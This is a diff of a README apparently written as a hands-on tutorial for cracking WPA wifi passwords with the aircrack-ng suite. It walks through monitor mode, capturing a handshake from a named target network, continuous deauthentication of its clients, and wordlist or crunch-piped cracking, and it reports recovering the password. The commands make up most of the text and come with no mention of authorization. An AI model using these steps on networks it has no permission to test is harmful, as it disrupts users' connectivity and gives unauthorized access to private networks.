@@ -1,6 +1,6 @@
 # Example crack wpa attack with aircrack-ng
 
-i use tp-link wn725n (chipset rtl8188eus) and parrotOS, the name of it is ridiculous
+i use tp-link wn725n (chipset rtl8188eus) and parrotOS
 
 connect your card wifi and check
 
@@ -8,20 +8,20 @@ connect your card wifi and check
 iwconfig
 ```
 
-![image](https://user-images.githubusercontent.com/90561566/166419875-330952f9-ce4a-416d-b403-ec2d39ecc3dc.png)
+![image](https://user-images.githubusercontent.com/90561566/168417974-d9650a49-951b-4a6f-ab8b-12e4f7cd7455.png)
 
 ```
 airmon-ng check kill
 airmon-ng start <iface>
 ```
 
-![image](https://user-images.githubusercontent.com/90561566/167644236-e2f6fab8-8d12-4e0c-aebf-7d98e95e88c3.png)
+![image](https://user-images.githubusercontent.com/90561566/168418068-964e3312-b269-44fc-9721-398be478f2ce.png)
 
 ```
 airodump-ng <iface>
 ```
 
-![image](https://user-images.githubusercontent.com/90561566/166420371-20c0ce94-e653-4cda-b87b-72f071d94a49.png)
+![image](https://user-images.githubusercontent.com/90561566/168418114-4d4e8f16-58ec-4358-bc99-dd625f4e7d26.png)
 
 i will choose target is `Quang Minh 2G`, CH `11`, bssid `5C:1A:6F:88:19:19`
 
@@ -29,13 +29,15 @@ i will choose target is `Quang Minh 2G`, CH `11`, bssid `5C:1A:6F:88:19:19`
 airodump-ng -c <CH> --bssid <bssid> -w out <iface>
 ```
 
-![image](https://user-images.githubusercontent.com/90561566/166420867-1c3d3d5a-5c26-4f67-b271-84f9a19c81d0.png)
+![image](https://user-images.githubusercontent.com/90561566/168418356-e901847a-143e-4509-85b2-efeb783b1ca1.png)
 
 new terminal
 
 ```
 aireplay-ng --deauth 0 -a <bssid> <iface>
 ```
+
+![image](https://user-images.githubusercontent.com/90561566/168418251-fe850fa5-0687-4241-836d-9d287f276e95.png)
 
 wait about 5s, return airodump-ng terminal, if you see WPA handshake is okay and Ctrl+C to stop (both)
 
@@ -69,6 +71,12 @@ now you can crack wpa with
 
 ```
 aircrack-ng -w password.txt out*.cap
+```
+
+or redirect directly from crunch
+
+```
+crunch <min> <max> <charset> -t <pattern> | aircrack-ng -w- out*.cap
 ```
 
 ![image](https://user-images.githubusercontent.com/90561566/166444763-a0cb15e0-309f-430e-bc6d-ce92e7863f0e.png)
@@ -111,7 +119,10 @@ done! there is the password (crack speed is about 36 GB/s)
 
 ![image](https://user-images.githubusercontent.com/90561566/166684325-e337e6cd-f376-4172-91a2-617a80a3156c.png)
 
-
+```
+airmon-ng stop <iface>
+service NetworkManager restart
+```
 
 
 
